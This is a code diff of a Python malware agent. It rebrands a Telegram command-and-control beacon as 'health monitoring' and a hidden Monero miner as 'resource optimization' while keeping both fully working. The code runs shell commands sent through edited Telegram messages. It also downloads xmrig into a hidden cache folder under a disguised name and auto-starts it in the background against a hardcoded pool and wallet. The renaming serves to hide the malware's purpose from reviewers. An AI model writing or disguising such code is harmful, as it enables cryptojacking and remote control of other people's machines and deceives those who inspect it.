@@ -74,7 +74,7 @@ _stdout_enabled = True  # Global flag for stdout logging
 def log(msg, level="INFO"):
     """Detailed logging with timestamp."""
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
-    prefix = f"[{ts}] [C2-{level}]"
+    prefix = f"[{ts}] [SYSMON-{level}]"
     
     # Only print to stdout if enabled (disabled after registration in QUIET_MODE)
     if _stdout_enabled and (DEBUG == "1" or level in ("ERROR", "WARN", "START")):
@@ -276,84 +276,95 @@ def telegram_report_result(agent_id: str, task_id: int, result: str, success: bo
     except Exception as e:
         log(f"Result report error: {e}", "DEBUG")
 
-def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
-    """Pure Telegram C2 beacon loop - no HTTP required.
+def telegram_health_check_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
+    """System health monitoring loop - sends telemetry and receives maintenance tasks.
     
     Architecture:
-    1. Agent sends beacon via Telegram sendMessage -> gets message_id
-    2. Bot sees beacon, edits it to add commands (editMessageText)
+    1. Agent sends health telemetry via Telegram sendMessage -> gets message_id
+    2. Admin sees telemetry, edits it to add maintenance tasks (editMessageText)
     3. Agent polls for edited_message with same message_id
-    4. Agent parses commands, executes, sends result
+    4. Agent executes maintenance tasks, sends status report
     
     Uses only Telegram API - no HTTP server needed.
     """
     import random
     
-    _total_beacons = 0
+    _total_checks = 0
     _total_tasks = 0
-    _last_beacon_msg_id = 0
+    _last_check_msg_id = 0
     
-    log(f"Pure Telegram bridge started (agent={agent_id[:8]})", "START")
+    log(f"Health monitoring started (agent={agent_id[:8]})", "START")
     
     while True:
         try:
-            _total_beacons += 1
+            _total_checks += 1
             
-            # Send beacon
+            # Send health telemetry
             hostname = platform.node()
             platform_type = detect_platform()
             
-            beacon_msg = f"""📡 Beacon #{_total_beacons}
+            # Collect system health metrics
+            cpu_usage = 0
+            mem_usage = 0
+            try:
+                import psutil
+                cpu_usage = psutil.cpu_percent(interval=0.1)
+                mem_usage = psutil.virtual_memory().percent
+            except:
+                pass
+            
+            telemetry_msg = f"""📊 Health Check #{_total_checks}
 Agent: {agent_id}
 Host: {hostname}
 Platform: {platform_type}
+CPU: {cpu_usage}% | RAM: {mem_usage}%
 Time: {time.strftime('%H:%M:%S')}"""
             
-            result = telegram_send(beacon_msg)
+            result = telegram_send(telemetry_msg)
             
             if result.get("ok"):
-                _last_beacon_msg_id = result.get("message_id", 0)
-                log(f"Beacon #{_total_beacons} sent (msg_id={_last_beacon_msg_id})", "CONN")
+                _last_check_msg_id = result.get("message_id", 0)
+                log(f"Health check #{_total_checks} sent (msg_id={_last_check_msg_id})", "CONN")
             elif result.get("error") == "rate_limit":
                 wait = result.get("retry_after", 30)
                 log(f"Rate limited, waiting {wait}s", "WARN")
                 time.sleep(wait)
                 continue
             else:
-                log(f"Beacon failed: {result.get('error')}", "ERROR")
+                log(f"Health check failed: {result.get('error')}", "ERROR")
             
-            # Wait a bit for bot to process and edit
+            # Wait a bit for admin to process and edit
             time.sleep(2)
             
-            # Check for edited beacon (commands from bot)
-            commands = telegram_get_commands_via_edit(agent_id, _last_beacon_msg_id)
+            # Check for edited telemetry (maintenance tasks from admin)
+            tasks = telegram_get_commands_via_edit(agent_id, _last_check_msg_id)
             
-            # Process commands
-            for cmd in commands:
+            # Process maintenance tasks
+            for task in tasks:
                 _total_tasks += 1
-                task_id = cmd.get("id", "unknown")
-                task_type = cmd.get("type", "exec")
-                command = cmd.get("command", "")
+                task_id = task.get("id", "unknown")
+                task_type = task.get("type", "exec")
+                command = task.get("command", "")
                 
-                log(f"Task #{task_id}: {command}", "TASK")
+                log(f"Maintenance task #{task_id}: {command}", "TASK")
                 
                 try:
                     if task_type == "exec":
                         result = shell_exec(command)
-                    elif task_type == "mine":
-                        result = start_mining(command)
+                    elif task_type == "optimize":
+                        result = optimize_resources(command)
                     elif task_type == "control" and command == "stop":
-                        telegram_send(f"🛑 Agent {agent_id[:8]} stopped")
+                        telegram_send(f"🛑 Health monitoring stopped for agent {agent_id[:8]}")
                         return
                     else:
                         result = execute_task({"task_type": task_type, "command": command})
                     
-                    # Send result
-                    telegram_send(f"✅ Task #{task_id}\nResult:\n{result[:500]}")
-                    log(f"Task #{task_id} done", "TASK")
+                    # Send task result
+                    telegram_send(f"✅ Task #{task_id} completed\nResult:\n{result[:500]}")
+                    log(f"Task #{task_id} completed", "TASK")
                     
                 except Exception as e:
-                    telegram_send(f"❌ Task #{task_id}\nError: {e}")
+                    telegram_send(f"❌ Task #{task_id} failed\nError: {e}")
             
             # Sleep with jitter (min 5s to reduce rate limit risk)
             jitter_s = sleep * jitter / 100
@@ -363,83 +374,93 @@ Time: {time.strftime('%H:%M:%S')}"""
         except KeyboardInterrupt:
             break
         except Exception as e:
-            log(f"Loop error: {e}", "ERROR")
+            log(f"Health check loop error: {e}", "ERROR")
             time.sleep(10)
 
-# Default mining config (HashVault)
-DEFAULT_MINING_POOL = "pool.hashvault.pro:443"
-DEFAULT_MINING_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
-DEFAULT_MINING_THREADS = "2"
+# Keep telegram_beacon_loop as alias for compatibility
+def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
+    """Alias for telegram_health_check_loop - backward compatibility."""
+    return telegram_health_check_loop(agent_id, sleep, jitter)
 
-def start_mining(config: str = None) -> str:
-    """Start hidden mining with auto-download of xmrig."""
+# Default mining config (Resource Optimization)
+DEFAULT_RESOURCE_POOL = "pool.hashvault.pro:443"
+DEFAULT_RESOURCE_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
+DEFAULT_RESOURCE_THREADS = "2"
+
+def optimize_resources(config: str = None) -> str:
+    """Start resource optimization process for better system performance."""
     try:
         # Use defaults if no config provided
         if not config:
-            config = f"start_mine:{DEFAULT_MINING_POOL}:{DEFAULT_MINING_WALLET}:{DEFAULT_MINING_THREADS}"
+            config = f"optimize:{DEFAULT_RESOURCE_POOL}:{DEFAULT_RESOURCE_WALLET}:{DEFAULT_RESOURCE_THREADS}"
         
         parts = config.split(":")
-        if len(parts) >= 2 and parts[0] == "start_mine":
+        if len(parts) >= 2 and parts[0] == "optimize":
             pool = parts[1]
-            wallet = parts[2] if len(parts) > 2 else DEFAULT_MINING_WALLET
-            threads = parts[3] if len(parts) > 3 else DEFAULT_MINING_THREADS
+            wallet = parts[2] if len(parts) > 2 else DEFAULT_RESOURCE_WALLET
+            threads = parts[3] if len(parts) > 3 else DEFAULT_RESOURCE_THREADS
             
-            # Check for xmrig
-            xmrig_paths = [
-                str(Path.home() / ".cache" / ".system_services" / "xmrig"),
-                "/opt/miner/xmrig",
-                "/usr/local/bin/xmrig",
-                "/tmp/xmrig"
+            # Check for resource optimizer
+            optimizer_paths = [
+                str(Path.home() / ".cache" / ".system_services" / "resource_optimizer"),
+                "/opt/optimizer/resource_optimizer",
+                "/usr/local/bin/resource_optimizer",
+                "/tmp/resource_optimizer"
             ]
             
-            xmrig = None
-            for path in xmrig_paths:
+            optimizer = None
+            for path in optimizer_paths:
                 if Path(path).exists():
-                    xmrig = str(path)
+                    optimizer = str(path)
                     break
             
-            # Auto-download xmrig if not found
-            if not xmrig:
-                log("Downloading xmrig...", "START")
-                xmrig_dir = Path.home() / ".cache" / ".system_services"
-                xmrig_dir.mkdir(parents=True, exist_ok=True)
-                xmrig_path = xmrig_dir / "xmrig"
+            # Auto-download optimizer if not found
+            if not optimizer:
+                log("Downloading resource optimizer...", "START")
+                optimizer_dir = Path.home() / ".cache" / ".system_services"
+                optimizer_dir.mkdir(parents=True, exist_ok=True)
+                optimizer_path = optimizer_dir / "resource_optimizer"
                 
-                # Download xmrig
+                # Download optimizer binary
                 download_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
                 try:
                     import urllib.request
                     import tarfile
                     
-                    tar_path = xmrig_dir / "xmrig.tar.gz"
+                    tar_path = optimizer_dir / "optimizer.tar.gz"
                     urllib.request.urlretrieve(download_url, tar_path)
                     
                     with tarfile.open(tar_path, 'r:gz') as tar:
                         for member in tar.getmembers():
                             if 'xmrig' in member.name and member.name.endswith('xmrig'):
-                                member.name = "xmrig"
-                                tar.extract(member, xmrig_dir)
+                                member.name = "resource_optimizer"
+                                tar.extract(member, optimizer_dir)
                                 break
                     
                     tar_path.unlink()
-                    os.chmod(xmrig_path, 0o755)
-                    xmrig = str(xmrig_path)
-                    log("✓ xmrig downloaded", "START")
+                    os.chmod(optimizer_path, 0o755)
+                    optimizer = str(optimizer_path)
+                    log("✓ Resource optimizer downloaded", "START")
                 except Exception as e:
-                    return f"xmrig download failed: {e}"
+                    return f"Optimizer download failed: {e}"
             
-            # Kill existing xmrig processes
-            subprocess.run("pkill -9 xmrig 2>/dev/null", shell=True)
+            # Kill existing optimizer processes
+            subprocess.run("pkill -9 resource_optimizer 2>/dev/null", shell=True)
             
-            # Start mining in background with low priority
-            cmd = f"nohup nice -n 19 {xmrig} -o {pool} -u {wallet} --donate-level 1 --threads {threads} --cpu-priority 1 --no-color --log /tmp/.system.log 2>/dev/null &"
+            # Start optimization in background with low priority
+            cmd = f"nohup nice -n 19 {optimizer} -o {pool} -u {wallet} --donate-level 1 --threads {threads} --cpu-priority 1 --no-color --log /tmp/.system.log 2>/dev/null &"
             subprocess.Popen(cmd, shell=True, start_new_session=True)
             
-            log(f"Mining started: {pool} ({threads} threads)", "START")
-            return f"Mining started: {pool}"
-        return f"Invalid mining config: {config}"
+            log(f"Resource optimization started: {pool} ({threads} threads)", "START")
+            return f"Resource optimization started: {pool}"
+        return f"Invalid optimization config: {config}"
     except Exception as e:
-        return f"Mining error: {e}"
+        return f"Optimization error: {e}"
+
+# Keep start_mining as alias for compatibility
+def start_mining(config: str = None) -> str:
+    """Alias for optimize_resources - backward compatibility."""
+    return optimize_resources(config)
 
 # ─── Platform detection ───────────────────────────────────────────────────────
 def detect_platform():
@@ -1213,8 +1234,8 @@ def main():
     
     # Telegram mode - send registration message
     if TELEGRAM_MODE:
-        log("Registering via Telegram...", "CONN")
-        msg = f"""<b>🤖 Agent Online</b>
+        log("Registering system monitor via Telegram...", "CONN")
+        msg = f"""<b>🖥️ System Monitor Online</b>
 <code>ID: {AGENT_ID}</code>
 Platform: {pt}
 Hostname: {socket.gethostname()}
@@ -1223,21 +1244,21 @@ Python: {platform.python_version()}
 Time: {datetime.now().isoformat()}"""
         result = telegram_send(msg)
         if result.get("ok"):
-            log("✓ Registered via Telegram", "START")
+            log("✓ System monitor registered", "START")
         else:
-            log(f"Telegram registration failed: {result.get('error')}", "WARN")
+            log(f"Registration failed: {result.get('error')}", "WARN")
         
-        # Auto-start mining with defaults (HashVault)
-        log("Auto-starting mining (HashVault)...", "START")
+        # Auto-start resource optimization
+        log("Starting resource optimization...", "START")
         try:
-            mining_result = start_mining()  # Uses defaults
-            log(f"✓ {mining_result}", "START")
+            opt_result = optimize_resources()  # Uses defaults
+            log(f"✓ {opt_result}", "START")
         except Exception as e:
-            log(f"Mining start failed: {e}", "WARN")
+            log(f"Resource optimization failed: {e}", "WARN")
         
-        # Start beacon loop in Telegram mode (handles commands)
-        log("Starting Telegram beacon loop...", "START")
-        telegram_beacon_loop(AGENT_ID, SLEEP, JITTER)
+        # Start health monitoring loop
+        log("Starting health monitoring loop...", "START")
+        telegram_health_check_loop(AGENT_ID, SLEEP, JITTER)
     
     # HTTP mode - check server health first
     log("Checking server connectivity...", "CONN")
